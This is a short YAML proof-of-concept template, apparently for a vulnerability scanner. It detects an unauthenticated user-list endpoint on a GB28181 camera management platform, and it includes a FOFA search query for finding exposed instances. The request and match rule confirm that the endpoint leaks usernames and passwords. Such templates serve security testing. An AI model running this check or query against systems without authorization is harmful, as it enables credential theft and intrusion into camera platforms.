id: poc-yaml-gb28181-camera-management-platform-unauthorized-access
info:
  name: GB28181摄像头管理平台 user 未授权访问漏洞
  severity: medium
  tags:
  - 未授权访问
  finger: GB28181摄像头管理平台
  fofa: body="国标28181"
requests:
- method: GET
  path: /api/user/all
  expression: "status_code == 200 && \ncontains(body,\"\\\"success\\\"\") &&\ncontains(body,\"\
    \\\"username\\\"\") &&\ncontains(body,\"\\\"password\\\"\") &&\ncontains(content_type,\"\
    application/json\")\n"
variables: {}
transport: http
